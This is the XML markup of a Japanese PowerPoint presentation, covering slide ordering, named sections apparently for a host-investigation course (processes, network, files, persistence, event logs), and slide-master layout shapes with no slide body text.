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removePersonalInfoOnSave="1" saveSubsetFonts="1" autoCompressPictures="0">
  <p:sldMasterIdLst>
    <p:sldMasterId id="2147483728" r:id="rId1"/>
  </p:sldMasterIdLst>
  <p:notesMasterIdLst>
    <p:notesMasterId r:id="rId65"/>
  </p:notesMasterIdLst>
  <p:handoutMasterIdLst>
    <p:handoutMasterId r:id="rId66"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="356" r:id="rId3"/>
    <p:sldId id="316" r:id="rId4"/>
    <p:sldId id="308" r:id="rId5"/>
    <p:sldId id="368" r:id="rId6"/>
    <p:sldId id="315" r:id="rId7"/>
    <p:sldId id="309" r:id="rId8"/>
    <p:sldId id="328" r:id="rId9"/>
    <p:sldId id="332" r:id="rId10"/>
    <p:sldId id="310" r:id="rId11"/>
    <p:sldId id="369" r:id="rId12"/>
    <p:sldId id="339" r:id="rId13"/>
    <p:sldId id="334" r:id="rId14"/>
    <p:sldId id="335" r:id="rId15"/>
    <p:sldId id="333" r:id="rId16"/>
    <p:sldId id="340" r:id="rId17"/>
    <p:sldId id="337" r:id="rId18"/>
    <p:sldId id="338" r:id="rId19"/>
    <p:sldId id="341" r:id="rId20"/>
    <p:sldId id="312" r:id="rId21"/>
    <p:sldId id="317" r:id="rId22"/>
    <p:sldId id="357" r:id="rId23"/>
    <p:sldId id="354" r:id="rId24"/>
    <p:sldId id="353" r:id="rId25"/>
    <p:sldId id="314" r:id="rId26"/>
    <p:sldId id="377" r:id="rId27"/>
    <p:sldId id="376" r:id="rId28"/>
    <p:sldId id="345" r:id="rId29"/>
    <p:sldId id="371" r:id="rId30"/>
    <p:sldId id="323" r:id="rId31"/>
    <p:sldId id="365" r:id="rId32"/>
    <p:sldId id="325" r:id="rId33"/>
    <p:sldId id="366" r:id="rId34"/>
    <p:sldId id="372" r:id="rId35"/>
    <p:sldId id="374" r:id="rId36"/>
    <p:sldId id="344" r:id="rId37"/>
    <p:sldId id="363" r:id="rId38"/>
    <p:sldId id="361" r:id="rId39"/>
    <p:sldId id="360" r:id="rId40"/>
    <p:sldId id="311" r:id="rId41"/>
    <p:sldId id="322" r:id="rId42"/>
    <p:sldId id="367" r:id="rId43"/>
    <p:sldId id="373" r:id="rId44"/>
    <p:sldId id="329" r:id="rId45"/>
    <p:sldId id="331" r:id="rId46"/>
    <p:sldId id="321" r:id="rId47"/>
    <p:sldId id="330" r:id="rId48"/>
    <p:sldId id="358" r:id="rId49"/>
    <p:sldId id="359" r:id="rId50"/>
    <p:sldId id="362" r:id="rId51"/>
    <p:sldId id="370" r:id="rId52"/>
    <p:sldId id="380" r:id="rId53"/>
    <p:sldId id="319" r:id="rId54"/>
    <p:sldId id="320" r:id="rId55"/>
    <p:sldId id="378" r:id="rId56"/>
    <p:sldId id="379" r:id="rId57"/>
    <p:sldId id="348" r:id="rId58"/>
    <p:sldId id="349" r:id="rId59"/>
    <p:sldId id="350" r:id="rId60"/>
    <p:sldId id="355" r:id="rId61"/>
    <p:sldId id="351" r:id="rId62"/>
    <p:sldId id="352" r:id="rId63"/>
    <p:sldId id="343" r:id="rId6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" id="{7B7F26CA-F912-4E01-98A8-E2F6B32D9563}">
          <p14:sldIdLst>
            <p14:sldId id="256"/>
            <p14:sldId id="356"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="基本事項" id="{EB3BACC1-B035-4986-A2E3-6A90FD4DB411}">
          <p14:sldIdLst>
            <p14:sldId id="316"/>
            <p14:sldId id="308"/>
            <p14:sldId id="368"/>
            <p14:sldId id="315"/>
            <p14:sldId id="309"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="プロセス" id="{D2715DBB-7274-47FD-8C8C-1A7F240FCDA8}">
          <p14:sldIdLst>
            <p14:sldId id="328"/>
            <p14:sldId id="332"/>
            <p14:sldId id="310"/>
            <p14:sldId id="369"/>
            <p14:sldId id="339"/>
            <p14:sldId id="334"/>
            <p14:sldId id="335"/>
            <p14:sldId id="333"/>
            <p14:sldId id="340"/>
            <p14:sldId id="337"/>
            <p14:sldId id="338"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="ネットワーク" id="{2389CA03-0C6F-4585-A0C7-71305D440649}">
          <p14:sldIdLst>
            <p14:sldId id="341"/>
            <p14:sldId id="312"/>
            <p14:sldId id="317"/>
            <p14:sldId id="357"/>
            <p14:sldId id="354"/>
            <p14:sldId id="353"/>
            <p14:sldId id="314"/>
            <p14:sldId id="377"/>
            <p14:sldId id="376"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="ファイル" id="{10541F0C-8BE6-4A37-B20F-89B3B76B49A8}">
          <p14:sldIdLst>
            <p14:sldId id="345"/>
            <p14:sldId id="371"/>
            <p14:sldId id="323"/>
            <p14:sldId id="365"/>
            <p14:sldId id="325"/>
            <p14:sldId id="366"/>
            <p14:sldId id="372"/>
            <p14:sldId id="374"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="永続化" id="{50E8BA5C-A26B-446C-A55B-57FA69BE2B9D}">
          <p14:sldIdLst>
            <p14:sldId id="344"/>
            <p14:sldId id="363"/>
            <p14:sldId id="361"/>
            <p14:sldId id="360"/>
            <p14:sldId id="311"/>
            <p14:sldId id="322"/>
            <p14:sldId id="367"/>
            <p14:sldId id="373"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="イベントログ" id="{F0B05FBF-EB70-4E13-B653-689436E6D9D8}">
          <p14:sldIdLst>
            <p14:sldId id="329"/>
            <p14:sldId id="331"/>
            <p14:sldId id="321"/>
            <p14:sldId id="330"/>
            <p14:sldId id="358"/>
            <p14:sldId id="359"/>
            <p14:sldId id="362"/>
            <p14:sldId id="370"/>
            <p14:sldId id="380"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="環境整備" id="{2C9068A4-CDB7-49A2-8830-D04B0C082348}">
          <p14:sldIdLst>
            <p14:sldId id="319"/>
            <p14:sldId id="320"/>
            <p14:sldId id="378"/>
            <p14:sldId id="379"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="学習案内" id="{4D9FA9F3-ED29-4A83-8259-CA8320A15591}">
          <p14:sldIdLst>
            <p14:sldId id="348"/>
            <p14:sldId id="349"/>
            <p14:sldId id="350"/>
            <p14:sldId id="355"/>
          </p14:sldIdLst>
        </p14:section>
        <p14:section name="まとめ" id="{CDAD71DF-CEB9-4FE1-A088-1259878BB456}">
          <p14:sldIdLst>
            <p14:sldId id="351"/>
            <p14:sldId id="352"/>
            <p14:sldId id="343"/>
          </p14:sldIdLst>
        </p14:section>
      </p14:sectionLst>
    </p:ext>
    <p:ext uri="{EFAFB233-063F-42B5-8137-9DF3F51BA10A}">
      <p15:sldGuideLst xmlns:p15="http://schemas.microsoft.com/office/powerpoint/2012/main">
        <p15:guide id="17" pos="3840" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="18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1BC"/>
    <a:srgbClr val="FFFF00"/>
    <a:srgbClr val="FFFFFF"/>
    <a:srgbClr val="000000"/>
    <a:srgbClr val="777777"/>
    <a:srgbClr val="3A0000"/>
    <a:srgbClr val="260000"/>
    <a:srgbClr val="1E0007"/>
    <a:srgbClr val="2A000A"/>
    <a:srgbClr val="3E00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2B3E81-9253-4E02-B35E-69006F35AA66}" v="153" dt="2023-12-06T09:15:51.3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2" autoAdjust="0"/>
    <p:restoredTop sz="85743" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr>
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="78" d="100"/>
          <a:sy n="78" d="100"/>
        </p:scale>
        <p:origin x="888" y="7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40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0660"/>
    </p:cViewPr>
  </p:sorterViewPr>
  <p:notesViewPr>
    <p:cSldViewPr showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="76" d="100"/>
          <a:sy n="76" d="100"/>
        </p:scale>
        <p:origin x="3600" y="102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CA9A1-49A5-4813-BE73-64411D697E83}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2023/12/6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2E35D2-4F1F-4BDF-88EC-2B2C6B4495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01498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218005-AB2E-4230-9CBF-EC876F8C3946}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2023/12/6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6E3972-898B-454C-95F2-E930BA80A4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0730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E3972-898B-454C-95F2-E930BA80A49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1550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E3972-898B-454C-95F2-E930BA80A49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47543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E3972-898B-454C-95F2-E930BA80A49A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5110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E3972-898B-454C-95F2-E930BA80A49A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41858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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>33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08163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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>34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75252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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>42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8274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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>51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90029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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>54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11289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E3972-898B-454C-95F2-E930BA80A49A}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>55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0210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BC2F38E-115D-473A-AA13-8CACDAC407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altLang="ja-JP"/>
              <a:t>© Presentation Design</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0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49F1AAF4-136B-49B5-8509-D8D6F5305E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876072" y="3085888"/>
            <a:ext cx="10439856" cy="677108"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="110000"/>
              </a:lnSpc>
              <a:defRPr sz="4000" b="1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字幕 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{23AFDC8E-8CC6-4A7D-AF07-BC3A49D1CA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300" y="2420888"/>
            <a:ext cx="10439400" cy="424732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マスター サブタイトルの書式設定</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="直角三角形 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52FC0CF8-3490-445C-AAD8-397B8EBA657E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipV="1">
            <a:off x="0" y="0"/>
            <a:ext cx="828000" cy="828000"/>
          </a:xfrm>
          <a:prstGeom prst="rtTriangle">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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7" name="直角三角形 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{744DC4E6-6F7C-47AB-8546-70F237955C94}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1">
            <a:off x="11364000" y="6030000"/>
            <a:ext cx="828000" cy="828000"/>
          </a:xfrm>
          <a:prstGeom prst="rtTriangle">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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77836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ChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="232898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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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 bwMode="gray">
          <a:xfrm>
            <a:off x="2906584" y="1051200"/>
            <a:ext cx="8409115" cy="396044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gray">
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="232898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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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78D3866-6216-4C8A-916E-396710976F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0EE96AC-D8C9-4416-968E-5D8A2D44A3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93928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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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中扉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/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr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0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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78486" y="2945133"/>
            <a:ext cx="10635028" cy="931738"/>
          </a:xfrm>
          <a:ln w="6350">
            <a:solidFill>
              <a:schemeClr val="tx2"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="251999" tIns="251999" rIns="251999" bIns="180000">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:defRPr sz="2799">
                <a:solidFill>
                  <a:schemeClr val="tx2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797D66-6B2B-45E3-BE20-BAAF90820D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2ECE19-D8AD-4E50-B2B3-CF83747DBC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698867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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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｜2分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ChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="639763"/>
            <a:ext cx="12192000" cy="365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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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CA3C225-AC47-4EF6-8947-ADB1A48D8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13AE47-FD4C-43E4-9ABA-F22918219A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C49C2B-E4A3-4368-A638-B00FFF2789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60100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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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｜3分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>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="639763"/>
            <a:ext cx="12192000" cy="365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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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CA3C225-AC47-4EF6-8947-ADB1A48D8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13AE47-FD4C-43E4-9ABA-F22918219A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C49C2B-E4A3-4368-A638-B00FFF2789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48383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02" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="5178" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="3" pos="2865" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="4" pos="481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補足情報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AF9EA8A6-816C-4557-A9F5-2415803B4301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 lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="角丸四角形 6"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="12192000" cy="656692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 0"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx1">
              <a:alpha val="90000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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8" name="角丸四角形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="12192000" cy="656692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 0"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx1">
              <a:alpha val="80000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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B1E27A7-F85E-4098-A526-D2C45A005A28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C78C479-06EF-44C2-8736-BC5FF0B02C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8843D7-25DC-44DE-8CA7-9F51469C43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61829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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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補足情報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フリーフォーム: 図形 15">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E19C71F7-DBAE-480A-9026-30B020360793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custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 183223 w 12192000"/>
              <a:gd name="connsiteY0" fmla="*/ 144000 h 6858000"/>
              <a:gd name="connsiteX1" fmla="*/ 144000 w 12192000"/>
              <a:gd name="connsiteY1" fmla="*/ 183223 h 6858000"/>
              <a:gd name="connsiteX2" fmla="*/ 144000 w 12192000"/>
              <a:gd name="connsiteY2" fmla="*/ 6674777 h 6858000"/>
              <a:gd name="connsiteX3" fmla="*/ 183223 w 12192000"/>
              <a:gd name="connsiteY3" fmla="*/ 6714000 h 6858000"/>
              <a:gd name="connsiteX4" fmla="*/ 12008777 w 12192000"/>
              <a:gd name="connsiteY4" fmla="*/ 6714000 h 6858000"/>
              <a:gd name="connsiteX5" fmla="*/ 12048000 w 12192000"/>
              <a:gd name="connsiteY5" fmla="*/ 6674777 h 6858000"/>
              <a:gd name="connsiteX6" fmla="*/ 12048000 w 12192000"/>
              <a:gd name="connsiteY6" fmla="*/ 183223 h 6858000"/>
              <a:gd name="connsiteX7" fmla="*/ 12008777 w 12192000"/>
              <a:gd name="connsiteY7" fmla="*/ 144000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183223" y="144000"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="161561" y="144000"/>
                  <a:pt x="144000" y="161561"/>
                  <a:pt x="144000" y="183223"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="144000" y="6674777"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="144000" y="6696439"/>
                  <a:pt x="161561" y="6714000"/>
                  <a:pt x="183223" y="6714000"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="12008777" y="6714000"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="12030439" y="6714000"/>
                  <a:pt x="12048000" y="6696439"/>
                  <a:pt x="12048000" y="6674777"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="12048000" y="183223"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="12048000" y="161561"/>
                  <a:pt x="12030439" y="144000"/>
                  <a:pt x="12008777" y="14400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 w="6350"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34800" y="475200"/>
            <a:ext cx="11520000" cy="396044"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="11000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7" name="フッター プレースホルダー 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC67B7D5-0E54-42C4-902F-5C3D689F18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76299" y="6440400"/>
            <a:ext cx="10439401" cy="265733"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0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92CC0926-0B0E-4667-8BFE-C5B81525D8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80274" y="6440400"/>
            <a:ext cx="376366" cy="265733"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/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30265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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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補足情報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AF9EA8A6-816C-4557-A9F5-2415803B4301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 lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="角丸四角形 6"/>
          <p:cNvSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="12192000" cy="656692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 0"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx1">
              <a:alpha val="90000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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8" name="角丸四角形 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="1"/>
            <a:ext cx="12192000" cy="656692"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 0"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2">
              <a:alpha val="80000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"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B1E27A7-F85E-4098-A526-D2C45A005A28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C78C479-06EF-44C2-8736-BC5FF0B02C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8843D7-25DC-44DE-8CA7-9F51469C43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74573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ブランク（ベースカラー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23A8F1-A33D-4AE4-BF35-43FC3E45B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AAB6DA2-71E5-43F6-8D48-8532E69246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86DC252-7A3C-4D8B-9523-11BEBD2172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6634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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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ブランク（サブカラー｜無彩色）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 lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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0A0A7D-BAE1-4625-B950-E4C38A13B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B905AC4-E63C-4FC1-B2BC-9CF537226A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D7AB175-7137-495A-BD7F-8CFF85DB24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069049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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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ブランク（サブカラー｜メイン）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0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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926B92A0-EDED-4536-9E58-2FBD4765E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773A276-5A07-4C72-BB63-F049B1756F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C934225-B3D1-4850-857E-182D81C55F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81911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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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ブランク（メインカラー）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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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914F7458-3811-4411-A9E0-A6A5FC4B0F7B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D3B8F83-2622-4E21-9752-B2AD526951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17626CC-A741-4F6E-8DF7-50139980DC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626743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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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ブランク（無彩色）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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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5C10651-325F-4FB9-A135-70BFA6055C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4AB77E-F94E-4A0E-B493-C443A1D33A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C8D07CF8-40DD-4A95-8FC1-F5D0A8B7353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107786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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="4067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ブランク（ブラック）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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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3E49A9F-23EA-4411-8ADD-28B41C64627B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6C5FE16-A2DE-473F-AC61-49592F55CE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ja-JP" dirty="0"/>
              <a:t>© Presentation Design</a:t>
            </a:r>
            <a:endParaRPr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F4B76CF-DE85-4A94-8D19-AFDF758ED3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645351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13" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="FBAE40"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="406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06F3A714-952D-4B82-9300-94D328F5BEB6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lIns="0" tIns="0" rIns="0" bIns="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="1799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BC2F38E-115D-473A-AA13-8CACDAC407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altLang="ja-JP" dirty="0"/>
              <a:t>© Presentation Design</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0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49F1AAF4-136B-49B5-8509-D8D6F5305E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ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="876072" y="3085888"/>
            <a:ext cx="10439856" cy="677108"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="110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6" name="直角三角形 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{52FC0CF8-3490-445C-AAD8-397B8EBA657E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeAspect="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1"/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm flipV="1">
            <a:off x="0" y="0"/>
            <a:ext cx="828000" cy="828000"/>
          </a:xfrm>
